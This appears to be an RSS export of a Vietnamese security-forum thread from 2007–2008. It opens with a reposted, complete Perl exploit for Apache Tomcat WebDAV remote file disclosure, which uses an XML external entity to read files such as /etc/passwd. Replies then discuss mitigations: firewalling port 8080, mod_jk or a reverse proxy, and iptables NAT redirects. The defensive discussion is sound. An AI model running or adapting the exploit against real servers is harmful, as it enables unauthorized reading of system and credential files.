@@ -1,0 +1,357 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Apache Tomcat File Disclosure (Exploit)"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Apache Tomcat File Disclosure (Exploit)"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ Nguồn:<span class="link"> http://www.milw0rm.com/exploits/4530</span>
+Đăng lại ở Securiteam:<span class="link"> http://www.securiteam.com/exploits/6S00D1FK0K.html</span>
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#!/usr/bin/perl
+#******************************************************
+# Apache Tomcat Remote File Disclosure Zeroday Xploit
+# kcdarookie aka eliteb0y / 2007
+#
+# thanx to the whole team & andi :&#41;
+# +++KEEP PRIV8+++
+#
+# This Bug may reside in different WebDav implementations,
+# Warp your mind!
+# +You will need auth for the exploit to work...
+#******************************************************
+
+use IO::Socket;
+use MIME::Base64; ### FIXME! Maybe support other auths too ?
+
+# SET REMOTE PORT HERE
+$remoteport = 8080;
+
+sub usage {
+	print "Apache Tomcat Remote File Disclosure Zeroday Xploit\n";
+	print "kcdarookie aka eliteb0y / 2007\n";
+	print "usage: perl TOMCATXPL &lt;remotehost&gt; &lt;webdav file&gt; &lt;file to retrieve&gt; &#91;username&#93; &#91;password&#93;\n";
+	print "example: perl TOMCATXPL www.hostname.com /webdav /etc/passwd tomcat tomcat\n";exit;
+}
+
+if &#40;$#ARGV &lt; 2&#41; {usage&#40;&#41;;}
+
+$hostname = $ARGV&#91;0&#93;;
+$webdavfile = $ARGV&#91;1&#93;;
+$remotefile = $ARGV&#91;2&#93;;
+
+$username = $ARGV&#91;3&#93;;
+$password = $ARGV&#91;4&#93;;
+
+my $sock = IO::Socket::INET-&gt;new&#40;PeerAddr =&gt; $hostname,
+                              PeerPort =&gt; $remoteport,
+                              Proto =&gt; 'tcp'&#41;;
+                              
+$|=1;
+$BasicAuth = encode_base64&#40;"$username:$password"&#41;;
+
+$KRADXmL =
+"&lt;?xml version=\"1.0\"?&gt;\n"
+."&lt;!DOCTYPE REMOTE &#91;\n"
+."&lt;!ENTITY RemoteX SYSTEM \"$remotefile\"&gt;\n"
+."&#93;&gt;\n"
+."&lt;D:lockinfo xmlns: D='DAV:'&gt;\n"
+."&lt;D:lockscope&gt;&lt;D:exclusive/&gt;&lt;/D:lockscope&gt;\n"
+."&lt;D:locktype&gt;&lt;D:write/&gt;&lt;/D:locktype&gt;\n"
+."&lt;D:owner&gt;\n"
+."&lt;D:href&gt;\n"
+."&lt;REMOTE&gt;\n"
+."&lt;RemoteX&gt;&RemoteX;&lt;/RemoteX&gt;\n"
+."&lt;/REMOTE&gt;\n"
+."&lt;/D:href&gt;\n"
+."&lt;/D:owner&gt;\n"
+."&lt;/D:lockinfo&gt;\n";
+
+print "Apache Tomcat Remote File Disclosure Zeroday Xploit\n";
+print "kcdarookie aka eliteb0y / 2007\n";
+print "Launching Remote Exploit...\n";
+
+$ExploitRequest =
+ "LOCK $webdavfile HTTP/1.1\r\n"
+."Host: $hostname\r\n";
+
+if &#40;$username ne ""&#41; {
+	$ExploitRequest .= "Authorization: Basic $BasicAuth\r\n";
+}
+$ExploitRequest .= "Content-Type: text/xml\r\nContent-Length: ".length&#40;$KRADXmL&#41;."\r\n\r\n" . $KRADXmL;
+
+print $sock $ExploitRequest;
+
+while&#40;&lt;$sock&gt;&#41; {
+	print;
+}</pre>
+		</div>
+
+Từ lúc exploit này được công bố (15/10/2007) đến nay, HVA bị thử không dưới 100 lần.
+
+Tips:
+
+- config Tomcat HTTP connector cho localhost, not all interfaces.
+- filter port 8080 trên firewall.
+- dùng mod_jk hoặc proxy đứng trước Tomcat.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93126</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93126</link>
+				<pubDate><![CDATA[Fri, 26 Oct 2007 09:08:52]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ Nếu em đoán không nhầm thì cái này vô dụng với HVA vì bác conmale cho thằng apache chặn trước Tomcat rồi còn đâu :))]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93443</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93443</link>
+				<pubDate><![CDATA[Sat, 27 Oct 2007 19:41:25]]> GMT</pubDate>
+				<author><![CDATA[ K4i]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">K4i wrote:</cite><br>
+		<blockquote>Nếu em đoán không nhầm thì cái này vô dụng với HVA vì bác conmale cho thằng apache chặn trước Tomcat rồi còn đâu :))&nbsp;
+		</blockquote>
+
+Tớ nghĩ là bồ đoán nhầm.
+
+Bản Apache này có tên là Tomcat.
+
+FaL]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93467</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93467</link>
+				<pubDate><![CDATA[Sat, 27 Oct 2007 22:49:03]]> GMT</pubDate>
+				<author><![CDATA[ FaL]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ Không nhầm đâu FaL, em để ý đoạn này:
+<blockquote> - dùng mod_jk hoặc proxy đứng trước Tomcat. &nbsp;
+		</blockquote>
+:)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93473</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93473</link>
+				<pubDate><![CDATA[Sat, 27 Oct 2007 23:33:18]]> GMT</pubDate>
+				<author><![CDATA[ pnco]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">FaL wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">K4i wrote:</cite><br>
+		<blockquote>Nếu em đoán không nhầm thì cái này vô dụng với HVA vì bác conmale cho thằng apache chặn trước Tomcat rồi còn đâu :))&nbsp;
+		</blockquote>
+
+Tớ nghĩ là bồ đoán nhầm.
+
+Bản Apache này có tên là Tomcat.
+
+FaL&nbsp;
+		</blockquote>
+
+Không phải đâu em.
+
+Apache là tên của nhóm Apache và ứng dụng http của Apache nổi tiếng đến nỗi người ta quen gọi Apache để ám chỉ cho apache web (http).
+
+Thật ra apache http và apache tomcat là hai ứng dụng hoàn toàn khác nhau. Lục lọi trên điễn dàn (hình như trong phần *nix) sẽ thấy có 1 bài anh nói về sự khác nhau giữa apache http và apache tomcat.
+
+to K4i:
+Có một số cách khác nhau. 
+
+1) dùng reverse proxy (như apache proxy, squid hoặc bất cứ reverse proxy appliance nào) để map từ port 80 (web) đến port 8080 (mặc định connector port của tomcat). 
+
+2) dùng apache http đứng trước apache tomcat và dùng mod_jk, một connector gắn liền apache web với apache tomcat xuyên qua AJP protocol.
+
+Cả 2 đều nhằm 1 mục đích là không cho access trực tiếp đến cổng mặc định 8080 của tomcat.
+
+Thân.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93521</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93521</link>
+				<pubDate><![CDATA[Sun, 28 Oct 2007 09:04:12]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ :( Đúng là em chưa biết gì nhiều về web nên nhầm lẫn lung tung...
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93550</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#93550</link>
+				<pubDate><![CDATA[Sun, 28 Oct 2007 13:56:33]]> GMT</pubDate>
+				<author><![CDATA[ FaL]]></author>
+			</item>
+			<item>
+				<title>Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote>Từ lúc exploit này được công bố (15/10/2007) đến nay, HVA bị thử không dưới 100 lần.
+
+Tips:
+- config Tomcat HTTP connector cho localhost, not all interfaces.
+- filter port 8080 trên firewall.
+- dùng mod_jk hoặc proxy đứng trước Tomcat.&nbsp;
+		</blockquote>
+
+Hi anh conmale, 
+
+Em dùng mod_jk cho Tomcat, không dám dùng mod_proxy  =(( 
+
+Theo như anh nói ở trên,  anh dùng iptables chặn cổng 8080 để tránh bị exploit , theo suy nghĩ của em, ta sẽ không cần filter trên cổng 8080 mà em sẽ dùng kỹ thuật NAT (PREROUTING, POSTROUTING) trên iptables , mục đích của em là wwwect bất kỳ các request từ cổng 8080 sang cổng 80 . :) 
+
+Em liều mạng như vậy được không anh  :(  ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116156</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116156</link>
+				<pubDate><![CDATA[Fri, 22 Feb 2008 16:21:37]]> GMT</pubDate>
+				<author><![CDATA[ subnetwork]]></author>
+			</item>
+			<item>
+				<title>Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Golden Autumn wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote>Từ lúc exploit này được công bố (15/10/2007) đến nay, HVA bị thử không dưới 100 lần.
+
+Tips:
+- config Tomcat HTTP connector cho localhost, not all interfaces.
+- filter port 8080 trên firewall.
+- dùng mod_jk hoặc proxy đứng trước Tomcat.&nbsp;
+		</blockquote>
+
+Hi anh conmale, 
+
+Em dùng mod_jk cho Tomcat, không dám dùng mod_proxy  =(( 
+
+Theo như anh nói ở trên,  anh dùng iptables chặn cổng 8080 để tránh bị exploit , theo suy nghĩ của em, ta sẽ không cần filter trên cổng 8080 mà em sẽ dùng kỹ thuật NAT (PREROUTING, POSTROUTING) trên iptables , mục đích của em là wwwect bất kỳ các request từ cổng 8080 sang cổng 80 . :) 
+
+Em liều mạng như vậy được không anh  :(  &nbsp;
+		</blockquote>
+
+Được quá đi chớ ;). Em biết lý do tại sao được không?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116320</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116320</link>
+				<pubDate><![CDATA[Sat, 23 Feb 2008 15:50:52]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ <blockquote>###### NAT rules ######
+echo "[+] Setting up NAT rules..."
+#iptables -t nat -A PREROUTING -d 192.168.1.2 -p tcp --dport 8080 -j REDIRECT --to-ports 80&nbsp;
+		</blockquote>
+
+Lệnh trên nó "nói" đây chính là "table nat" thuộc PREROUTING chain (PREROUTING chain được dùng để apply các rules trong bảng nat tức là quá trình nat sẽ được xữ lý trước khi thực hiện định tuyến) sau đó iptables cho phép các tcp package đi đến địa chỉ 192.168.1.2 ở cổng 8080 và sau đó nó chuyển package này đến cổng 80. Tức là iptables xữ lý các package trước khi nó chuyển đến cổng 80 .
+
+Còn về phần nào em chưa hiểu mong anh dạy bảo :) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116380</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116380</link>
+				<pubDate><![CDATA[Sun, 24 Feb 2008 00:18:14]]> GMT</pubDate>
+				<author><![CDATA[ subnetwork]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Golden Autumn wrote:</cite><br>
+		<blockquote><blockquote>###### NAT rules ######
+echo "[+] Setting up NAT rules..."
+#iptables -t nat -A PREROUTING -d 192.168.1.2 -p tcp --dport 8080 -j REDIRECT --to-ports 80&nbsp;
+		</blockquote>
+
+Lệnh trên nó "nói" đây chính là "table nat" thuộc PREROUTING chain (PREROUTING chain được dùng để apply các rules trong bảng nat tức là quá trình nat sẽ được xữ lý trước khi thực hiện định tuyến) sau đó iptables cho phép các tcp package đi đến địa chỉ 192.168.1.2 ở cổng 8080 và sau đó nó chuyển package này đến cổng 80. Tức là iptables xữ lý các package trước khi nó chuyển đến cổng 80 .
+
+Còn về phần nào em chưa hiểu mong anh dạy bảo :) &nbsp;
+		</blockquote>
+
+Đúng rồi đó em. Gói tin có dport là 8080 đã bị wwwect đến 80 ở IP layer trước khi nó đi lên layer cao hơn. Bởi thế, kẻ tấn công không có cơ hội truy cập cổng 8080 (của Tomcat) mà luôn luôn bị "ép" phải đi xuyên qua cổng 80 (của apache httpd). Kết quả là không thực hiện được exploit "Tomcat remote file disclosure".
+
+Thân.
+
+PS: dạy bảo cái gì ku? Dạo này đổ ra khách sáo hả?  :P ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116427</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116427</link>
+				<pubDate><![CDATA[Sun, 24 Feb 2008 10:10:27]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ Dạ, cách này em thấy cụ thể là ở HVA nhà ta nhất vì Tomcat mặc định chạy trên cổng 8080 sao HVA chỉ có mở cổng 80 , còn cổng 8080 anh conmale ổng "ém" ở đâu rồi cà . Theo phán đoán của em, có khả năng anh điều chỉnh như thế này .
+
+- Mặc định các ứng dụng trong Tomcat được lưu trữ trong thư mục webapps cho nên có thể anh điều chỉnh <b>appBase="webapps"</b> thành <b>/home/public_html/hvaonline</b> (Vistual Hosting Tomcat và Apache). Sau đó anh điều chỉnh iptables lên là xong, nếu có request từ đâu đó gởi đến cổng 8080 thì lập tức iptables chặn lại và "thông báo cho request đó" biết rằng bad request . 
+
+- Hoặc có thể anh điều chỉnh port trong server.xml (cái này em chưa thử nghiệm lần nào cả)  :D 
+
+2 nhận định trên chỉ là suy đoán của em . 
+
+<p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote> PS: dạy bảo cái gì ku? Dạo này đổ ra khách sáo hả?&nbsp;
+		</blockquote>
+
+Em đâu có khách sáo đâu anh :D mấy năm trời tự học với *nix, kiến thức thu thập được cũng nhờ sự giúp đỡ, hướng dẫn tận tình của anh cho nên anh là người thầy đầu tiên và HVA là thầy cuối cùng của em trong thế giới *nix .   :) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116441</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116441</link>
+				<pubDate><![CDATA[Sun, 24 Feb 2008 12:29:22]]> GMT</pubDate>
+				<author><![CDATA[ subnetwork]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Golden Autumn wrote:</cite><br>
+		<blockquote>Dạ, cách này em thấy cụ thể là ở HVA nhà ta nhất vì Tomcat mặc định chạy trên cổng 8080 sao HVA chỉ có mở cổng 80 , còn cổng 8080 anh conmale ổng "ém" ở đâu rồi cà . Theo phán đoán của em, có khả năng anh điều chỉnh như thế này .
+
+- Mặc định các ứng dụng trong Tomcat được lưu trữ trong thư mục webapps cho nên có thể anh điều chỉnh <b>appBase="webapps"</b> thành <b>/home/public_html/hvaonline</b> (Vistual Hosting Tomcat và Apache). Sau đó anh điều chỉnh iptables lên là xong, nếu có request từ đâu đó gởi đến cổng 8080 thì lập tức iptables chặn lại và "thông báo cho request đó" biết rằng bad request . 
+
+- Hoặc có thể anh điều chỉnh port trong server.xml (cái này em chưa thử nghiệm lần nào cả)  :D 
+
+2 nhận định trên chỉ là suy đoán của em . 
+&nbsp;
+		</blockquote>
+"Bật mí" cho một tí đây: ;)
+- Cổng tomcat chỉnh thành cổng khác, không còn là 8080 (mod_jk connect đến cổng "khác" ấy).
+- Firewall chặn hết, không cho truy cập đến cổng nào ngoài 80 (HTTP), 443 (HTTPS), 25 (SMTP) và 1 cổng SSH (không phải là cổng 22 :P )
+- appbase tương tự như em đoán.
+- Truy cập đến cổng 8080 sẽ chậm như... con rùa và kết thúc với: <i>"can't establish a connection"</i>
+
+Thân.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116458</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116458</link>
+				<pubDate><![CDATA[Sun, 24 Feb 2008 14:33:53]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ Anh sợ tụi nó khai thác SSH exploit hay sao mà chỉnh cổng 22 sang cổng khác vậy anh ... yêu vì em thấy lạ ở chổ cách khai thác Apache Tomcat File Disclosure (Exploit) nó đâu có dính dáng đến cổng 22 hay cổng nào đó được gán cho secure shell đâu anh ? ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116554</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116554</link>
+				<pubDate><![CDATA[Mon, 25 Feb 2008 09:17:48]]> GMT</pubDate>
+				<author><![CDATA[ subnetwork]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Golden Autumn wrote:</cite><br>
+		<blockquote>Anh sợ tụi nó khai thác SSH exploit hay sao mà chỉnh cổng 22 sang cổng khác vậy anh ... yêu vì em thấy lạ ở chổ cách khai thác Apache Tomcat File Disclosure (Exploit) nó đâu có dính dáng đến cổng 22 hay cổng nào đó được gán cho secure shell đâu anh ? &nbsp;
+		</blockquote>
+
+À... cổng SSH (và các cổng khác) anh liệt kê trên bài trước là danh sách các <b>cổng mở</b> trên HVA (để ai muốn scan port khỏi phải mất công  :P ). Nó không có liên quan gì đến Tomcat exploit cả.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116555</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116555</link>
+				<pubDate><![CDATA[Mon, 25 Feb 2008 09:37:10]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Re: Apache Tomcat File Disclosure (Exploit)</title>
+				<description><![CDATA[ Ra là vậy, "học trò" đã hiểu dụng ý của thầy . Cám ơn thầy   :D ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116556</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/15599.hva#116556</link>
+				<pubDate><![CDATA[Mon, 25 Feb 2008 09:46:20]]> GMT</pubDate>
+				<author><![CDATA[ subnetwork]]></author>
+			</item>
+	</channel>
+</rss>
